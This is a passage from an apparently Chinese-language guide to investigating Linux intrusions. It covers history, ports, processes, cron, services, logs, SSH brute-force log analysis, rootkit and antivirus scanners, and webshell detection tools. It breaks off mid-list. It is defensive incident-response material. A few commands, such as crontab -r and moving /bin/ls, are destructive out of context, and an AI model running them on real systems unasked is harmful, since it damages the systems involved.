\u4f46\u6b64\u547d\u4ee4\u5e76\u4e0d\u4f1a\u6e05\u9664\u4fdd\u5b58\u5728\u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\uff0c\u56e0\u6b64\u9700\u8981\u624b\u52a8\u5220\u9664.bash_profile\u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u8fdb\u5165\u7528\u6237\u76ee\u5f55\u4e0b cat .bash_history >> history.txt 1.3 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3 \u00b6 \u4f7f\u7528netstat \u7f51\u7edc\u8fde\u63a5\u547d\u4ee4\uff0c\u5206\u6790\u53ef\u7591\u7aef\u53e3\u3001IP\u3001PID netstat -antlp|more \u67e5\u770b\u4e0bpid\u6240\u5bf9\u5e94\u7684\u8fdb\u7a0b\u6587\u4ef6\u8def\u5f84\uff0c \u8fd0\u884cls -l /proc/$PID/exe\u6216file /proc/$PID/exe\uff08$PID \u4e3a\u5bf9\u5e94\u7684pid \u53f7\uff09 1.4 \u68c0\u67e5\u5f02\u5e38\u8fdb\u7a0b \u00b6 \u4f7f\u7528ps\u547d\u4ee4\uff0c\u5206\u6790\u8fdb\u7a0b ps aux | grep pid 1.5 \u68c0\u67e5\u5f00\u673a\u542f\u52a8\u9879 \u00b6 \u57fa\u672c\u4f7f\u7528\uff1a \u7cfb\u7edf\u8fd0\u884c\u7ea7\u522b\u793a\u610f\u56fe\uff1a \u8fd0\u884c\u7ea7\u522b \u542b\u4e49 0 \u5173\u673a 1 \u5355\u7528\u6237\u6a21\u5f0f\uff0c\u53ef\u4ee5\u60f3\u8c61\u4e3awindows\u7684\u5b89\u5168\u6a21\u5f0f\uff0c\u4e3b\u8981\u7528\u4e8e\u7cfb\u7edf\u4fee\u590d 2 \u4e0d\u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u4e0d\u542bNFS\u670d\u52a1 3 \u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u5c31\u662f\u6807\u51c6\u5b57\u7b26\u754c\u9762 4 \u7cfb\u7edf\u4fdd\u7559 5 \u56fe\u5f62\u6a21\u5f0f 6 \u91cd\u542f\u52a8 \u67e5\u770b\u8fd0\u884c\u7ea7\u522b\u547d\u4ee4 runlevel \u7cfb\u7edf\u9ed8\u8ba4\u5141\u8bb8\u7ea7\u522b vi /etc/inittab id=3\uff1ainitdefault \u7cfb\u7edf\u5f00\u673a\u540e\u76f4\u63a5\u8fdb\u5165\u54ea\u4e2a\u8fd0\u884c\u7ea7\u522b \u5f00\u673a\u542f\u52a8\u914d\u7f6e\u6587\u4ef6 /etc/rc.local /etc/rc.d/rc[0~6].d \u4f8b\u5b50:\u5f53\u6211\u4eec\u9700\u8981\u5f00\u673a\u542f\u52a8\u81ea\u5df1\u7684\u811a\u672c\u65f6\uff0c\u53ea\u9700\u8981\u5c06\u53ef\u6267\u884c\u811a\u672c\u4e22\u5728/etc/init.d\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u5728/etc/rc.d/rc*.d\u4e2d\u5efa\u7acb\u8f6f\u94fe\u63a5\u5373\u53ef root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh \u6b64\u5904sshd\u662f\u5177\u4f53\u670d\u52a1\u7684\u811a\u672c\u6587\u4ef6\uff0cS100ssh\u662f\u5176\u8f6f\u94fe\u63a5\uff0cS\u5f00\u5934\u4ee3\u8868\u52a0\u8f7d\u65f6\u81ea\u542f\u52a8\uff1b\u5982\u679c\u662fK\u5f00\u5934\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4ee3\u8868\u8fd0\u884c\u7ea7\u522b\u52a0\u8f7d\u65f6\u9700\u8981\u5173\u95ed\u7684\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u542f\u52a8\u9879\u6587\u4ef6\uff1a more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/ 1.6 \u68c0\u67e5\u5b9a\u65f6\u4efb\u52a1 \u00b6 \u57fa\u672c\u4f7f\u7528 1\u3001\u5229\u7528crontab\u521b\u5efa\u8ba1\u5212\u4efb\u52a1 \u57fa\u672c\u547d\u4ee4 crontab -l \u5217\u51fa\u67d0\u4e2a\u7528\u6237cron\u670d\u52a1\u7684\u8be6\u7ec6\u5185\u5bb9 Tips\uff1a\u9ed8\u8ba4\u7f16\u5199\u7684crontab\u6587\u4ef6\u4f1a\u4fdd\u5b58\u5728 (/var/spool/cron/\u7528\u6237\u540d \u4f8b\u5982: /var/spool/cron/root crontab -r \u5220\u9664\u6bcf\u4e2a\u7528\u6237cront\u4efb\u52a1(\u8c28\u614e\uff1a\u5220\u9664\u6240\u6709\u7684\u8ba1\u5212\u4efb\u52a1) crontab -e \u4f7f\u7528\u7f16\u8f91\u5668\u7f16\u8f91\u5f53\u524d\u7684crontab\u6587\u4ef6 \u5982\uff1a /1 * echo \"hello world\" >> /tmp/test.txt \u6bcf\u5206\u949f\u5199\u5165\u6587\u4ef6 2\u3001\u5229\u7528anacron\u5b9e\u73b0\u5f02\u6b65\u5b9a\u65f6\u4efb\u52a1\u8c03\u5ea6 \u4f7f\u7528\u6848\u4f8b \u6bcf\u5929\u8fd0\u884c /home/backup.sh\u811a\u672c\uff1a vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh \u5f53\u673a\u5668\u5728 backup.sh \u671f\u671b\u88ab\u8fd0\u884c\u65f6\u662f\u5173\u673a\u7684\uff0canacron\u4f1a\u5728\u673a\u5668\u5f00\u673a\u5341\u5206\u949f\u4e4b\u540e\u8fd0\u884c\u5b83\uff0c\u800c\u4e0d\u7528\u518d\u7b49\u5f85 7\u5929\u3002 \u5165\u4fb5\u6392\u67e5 \u91cd\u70b9\u5173\u6ce8\u4ee5\u4e0b\u76ee\u5f55\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u811a\u672c /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* \u5c0f\u6280\u5de7\uff1a more /etc/cron.daily/* \u67e5\u770b\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6 1.7 \u68c0\u67e5\u670d\u52a1 \u00b6 \u670d\u52a1\u81ea\u542f\u52a8 \u7b2c\u4e00\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a chkconfig [--level \u8fd0\u884c\u7ea7\u522b] [\u72ec\u7acb\u670d\u52a1\u540d] [on|off] chkconfig \u2013level 2345 httpd on \u5f00\u542f\u81ea\u542f\u52a8 chkconfig httpd on \uff08\u9ed8\u8ba4level\u662f2345\uff09 \u7b2c\u4e8c\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4fee\u6539/etc/re.d/rc.local \u6587\u4ef6 \u52a0\u5165 /etc/init.d/httpd start \u7b2c\u4e09\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4f7f\u7528ntsysv\u547d\u4ee4\u7ba1\u7406\u81ea\u542f\u52a8\uff0c\u53ef\u4ee5\u7ba1\u7406\u72ec\u7acb\u670d\u52a1\u548cxinetd\u670d\u52a1\u3002 \u5165\u4fb5\u6392\u67e5 1\u3001\u67e5\u8be2\u5df2\u5b89\u88c5\u7684\u670d\u52a1\uff1a RPM\u5305\u5b89\u88c5\u7684\u670d\u52a1 chkconfig --list \u67e5\u770b\u670d\u52a1\u81ea\u542f\u52a8\u72b6\u6001\uff0c\u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684RPM\u5305\u5b89\u88c5\u7684\u670d\u52a1 ps aux | grep crond \u67e5\u770b\u5f53\u524d\u670d\u52a1 \u7cfb\u7edf\u57283\u4e0e5\u7ea7\u522b\u4e0b\u7684\u542f\u52a8\u9879 \u4e2d\u6587\u73af\u5883 chkconfig --list | grep \"3:\u542f\u7528\\|5:\u542f\u7528\" \u82f1\u6587\u73af\u5883 chkconfig --list | grep \"3:on\\|5:on\" \u6e90\u7801\u5305\u5b89\u88c5\u7684\u670d\u52a1 \u67e5\u770b\u670d\u52a1\u5b89\u88c5\u4f4d\u7f6e \uff0c\u4e00\u822c\u662f\u5728/user/local/ service httpd start \u641c\u7d22/etc/rc.d/init.d/ \u67e5\u770b\u662f\u5426\u5b58\u5728 1.8 \u68c0\u67e5\u5f02\u5e38\u6587\u4ef6 \u00b6 1\u3001\u67e5\u770b\u654f\u611f\u76ee\u5f55\uff0c\u5982/tmp\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u540c\u65f6\u6ce8\u610f\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u4ee5\u201c..\u201d\u4e3a\u540d\u7684\u6587\u4ef6\u5939\u5177\u6709\u9690\u85cf\u5c5e\u6027 2\u3001\u5f97\u5230\u53d1\u73b0WEBSHELL\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f \u53ef\u4ee5\u4f7f\u7528find\u547d\u4ee4\u6765\u67e5\u627e\uff0c\u5982 find /opt -iname \"*\" -atime 1 -type f \u627e\u51fa /opt \u4e0b\u4e00\u5929\u524d\u8bbf\u95ee\u8fc7\u7684\u6587\u4ef6 3\u3001\u9488\u5bf9\u53ef\u7591\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528stat\u8fdb\u884c\u521b\u5efa\u4fee\u6539\u65f6\u95f4\u3002 1.9 \u68c0\u67e5\u7cfb\u7edf\u65e5\u5fd7 \u00b6 \u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c \u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 0x02 \u5de5\u5177\u7bc7 \u00b6 2.1 Rootkit\u67e5\u6740 \u00b6 chkrootkit \u7f51\u5740\uff1a http://www.chkrootkit.org \u4f7f\u7528\u65b9\u6cd5\uff1a wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #\u7f16\u8bd1\u5b8c\u6210\u6ca1\u6709\u62a5\u9519\u7684\u8bdd\u6267\u884c\u68c0\u67e5 ./chkrootkit rkhunter \u7f51\u5740\uff1a http://rkhunter.sourceforge.net \u4f7f\u7528\u65b9\u6cd5\uff1a Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c 2.2 \u75c5\u6bd2\u67e5\u6740 \u00b6 Clamav ClamAV\u7684\u5b98\u65b9\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a http://www.clamav.net/download.html \u5b89\u88c5\u65b9\u5f0f\u4e00\uff1a 1\u3001\u5b89\u88c5zlib\uff1a wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #\u5b89\u88c5\u4e00\u4e0bgcc\u7f16\u8bd1\u73af\u5883\uff1a yum install gcc CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/ make && make install 2\u3001\u6dfb\u52a0\u7528\u6237\u7ec4clamav\u548c\u7ec4\u6210\u5458clamav\uff1a groupadd clamav useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav 3\u3001\u5b89\u88c5Clamav tar \u2013zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4\u3001\u914d\u7f6eClamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5\u3001ClamAV \u4f7f\u7528\uff1a /opt/clamav/bin/freshclam \u5347\u7ea7\u75c5\u6bd2\u5e93 ./clamscan \u2013h \u67e5\u770b\u76f8\u5e94\u7684\u5e2e\u52a9\u4fe1\u606f ./clamscan -r /home \u626b\u63cf\u6240\u6709\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u5c31\u4f7f\u7528 ./clamscan -r --bell -i /bin \u626b\u63cfbin\u76ee\u5f55\u5e76\u4e14\u663e\u793a\u6709\u95ee\u9898\u7684\u6587\u4ef6\u7684\u626b\u63cf\u7ed3\u679c \u5b89\u88c5\u65b9\u5f0f\u4e8c\uff1a #\u5b89\u88c5 yum install -y clamav #\u66f4\u65b0\u75c5\u6bd2\u5e93 freshclam #\u626b\u63cf\u65b9\u6cd5 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #\u626b\u63cf\u5e76\u6740\u6bd2 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #\u67e5\u770b\u65e5\u5fd7\u53d1\u73b0 cat /root/usrclamav.log |grep FOUND 2.3 webshell\u67e5\u6740 \u00b6 linux\u7248\uff1a \u6cb3\u9a6cwebshell\u67e5\u6740\uff1ahttp://www.shellpub.com \u6df1\u4fe1\u670dWebshell\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177\uff1ahttp://edr.sangfor.com.cn/backdoor_detection.html 2.4 RPM check\u68c0\u67e5 \u00b6 \u7cfb\u7edf\u5b8c\u6574\u6027\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305\uff0c\u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u662f\u5426\u88ab\u66ff\u6362\u4e86\uff1a ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\uff0c\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\uff0c\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u7b26\u90fd\u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \uff0c\u5982\u679c\u662f. (\u70b9) \u5219\u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002 \u9a8c\u8bc1\u5185\u5bb9\u4e2d\u76848\u4e2a\u4fe1\u606f\u7684\u5177\u4f53\u5185\u5bb9\u5982\u4e0b\uff1a S \u6587\u4ef6\u5927\u5c0f\u662f\u5426\u6539\u53d8 M \u6587\u4ef6\u7684\u7c7b\u578b\u6216\u6587\u4ef6\u7684\u6743\u9650\uff08rwx\uff09\u662f\u5426\u88ab\u6539\u53d8 5 \u6587\u4ef6MD5\u6821\u9a8c\u662f\u5426\u6539\u53d8\uff08\u53ef\u4ee5\u770b\u6210\u6587\u4ef6\u5185\u5bb9\u662f\u5426\u6539\u53d8\uff09 D \u8bbe\u5907\u4e2d\uff0c\u4ece\u4ee3\u7801\u662f\u5426\u6539\u53d8 L \u6587\u4ef6\u8def\u5f84\u662f\u5426\u6539\u53d8 U \u6587\u4ef6\u7684\u5c5e\u4e3b\uff08\u6240\u6709\u8005\uff09\u662f\u5426\u6539\u53d8 G \u6587\u4ef6\u7684\u5c5e\u7ec4\u662f\u5426\u6539\u53d8 T \u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6539\u53d8 \u5982\u679c\u547d\u4ee4\u88ab\u66ff\u6362\u4e86\uff0c\u5982\u679c\u8fd8\u539f\u56de\u6765\uff1a \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp \u5148\u628als\u8f6c\u79fb\u5230tmp\u76ee\u5f55\u4e0b\uff0c\u9020\u6210ls\u547d\u4ee4\u4e22\u5931\u7684\u5047\u8c61 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 2.5 linux\u5b89\u5168\u68c0\u67e5\u811a\u672c \u00b6 Github\u9879\u76ee\u5730\u5740\uff1a https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux \u5c3d\u4fe1\u4e66\u4e0d\u5982\u65e0\u4e66\uff0c\u5de5\u5177\u53ea\u662f\u8f85\u52a9\uff0c\u522b\u592a\u8fc7\u4e8e\u4f9d\u8d56\uff0c\u5173\u952e\u5728\u4e8e\u4f60\u5982\u4f55\u89e3\u51b3\u95ee\u9898\u7684\u601d\u8def\u3002 \u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177 \u00b6 \u5f53\u7f51\u7ad9\u670d\u52a1\u5668\u88ab\u5165\u4fb5\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4e00\u6b3eWebshell\u68c0\u6d4b\u5de5\u5177\uff0c\u6765\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0webshell\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\u7cfb\u7edf\u53ef\u80fd\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u3002 \u672c\u6587\u63a8\u8350\u4e8610\u6b3eWebshll\u68c0\u6d4b\u5de5\u5177\uff0c\u7528\u4e8e\u7f51\u7ad9\u5165\u4fb5\u6392\u67e5\u3002\u5f53\u7136\uff0c\u76ee\u524d\u5e02\u573a\u4e0a\u7684\u5f88\u591a\u4e3b\u673a\u5b89\u5168\u4ea7\u54c1\u4e5f\u90fd\u63d0\u4f9b\u8fd9\u79cdWebShell\u68c0\u6d4b\u80fd\u529b\uff0c\u6bd4\u5982\u963f\u91cc\u4e91\u3001\u9752\u85e4\u4e91\u3001safedog\u7b49\uff0c\u672c\u6587\u6682\u4e0d\u8ba8\u8bba\u3002 1\u3001D\u76fe_Web\u67e5\u6740 \u963fD\u51fa\u54c1\uff0c\u4f7f\u7528\u81ea\u884c\u7814\u53d1\u4e0d\u5206\u6269\u5c55\u540d\u7684\u4ee3\u7801\u5206\u6790\u5f15\u64ce\uff0c\u80fd\u5206\u6790\u66f4\u4e3a\u9690\u85cf\u7684WebShell\u540e\u95e8\u884c\u4e3a\u3002 \u517c\u5bb9\u6027\uff1a\u53ea\u63d0\u4f9bWindows\u7248\u672c\u3002 \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://www.d99net.net/down/WebShellKill_V2.0.9.zip 2\u3001\u767e\u5ea6WEBDIR+ \u4e0b\u4e00\u4ee3WebShell\u68c0\u6d4b\u5f15\u64ce\uff0c\u91c7\u7528\u5148\u8fdb\u7684\u52a8\u6001\u76d1\u6d4b\u6280\u672f\uff0c\u7ed3\u5408\u591a\u79cd\u5f15\u64ce\u96f6\u89c4\u5219\u67e5\u6740\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b\u5728\u7ebf\u67e5\u6740\u6728\u9a6c\uff0c\u514d\u8d39\u5f00\u653eAPI\u652f\u6301\u6279\u91cf\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a https://scanner.baidu.com/ 3\u3001\u6cb3\u9a6c \u4e13\u6ce8webshell\u67e5\u6740\u7814\u7a76\uff0c\u62e5\u6709\u6d77\u91cfwebshell\u6837\u672c\u548c\u81ea\u4e3b\u67e5\u6740\u6280\u672f\uff0c\u91c7\u7528\u4f20\u7edf\u7279\u5f81+\u4e91\u7aef\u5927\u6570\u636e\u53cc\u5f15\u64ce\u7684\u67e5\u6740\u6280\u672f\u3002\u67e5\u6740\u901f\u5ea6\u5feb\u3001\u7cbe\u5ea6\u9ad8\u3001\u8bef\u62a5\u4f4e\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301Windows\u3001linux\uff0c\u652f\u6301\u5728\u7ebf\u67e5\u6740\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a https://www.shellpub.com/ 4\u3001Web Shell Detector Webshell Detector\u5177\u6709\u201c Webshell\u201d\u7b7e\u540d\u6570\u636e\u5e93\uff0c\u53ef\u5e2e\u52a9\u8bc6\u522b\u9ad8\u8fbe99\uff05\u7684\u201c Webshell\u201d\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9bphp/python\u811a\u672c\uff0c\u53ef\u8de8\u5e73\u53f0\uff0c\u5728\u7ebf\u68c0\u6d4b\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a http://www.shelldetector.com/ github\u9879\u76ee\u5730\u5740\uff1a https://github.com/emposha/PHP-Shell-Detector 5\u3001CloudWalker\uff08\u7267\u4e91\uff09 \u4e00\u4e2a\u53ef\u6267\u884c\u7684\u547d\u4ee4\u884c\u7248\u672c Webshell \u68c0\u6d4b\u5de5\u5177\u3002\u76ee\u524d\uff0c\u9879\u76ee\u5df2\u505c\u6b62\u66f4\u65b0\u3002 \u517c\u5bb9\u6027\uff0c\u63d0\u4f9blinux\u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 \u5728\u7ebf\u67e5\u6740demo\uff1a https://webshellchop.chaitin.cn/ github\u9879\u76ee\u5730\u5740\uff1a https://github.com/chaitin/cloudwalker 6\u3001Sangfor WebShellKill Sangfor 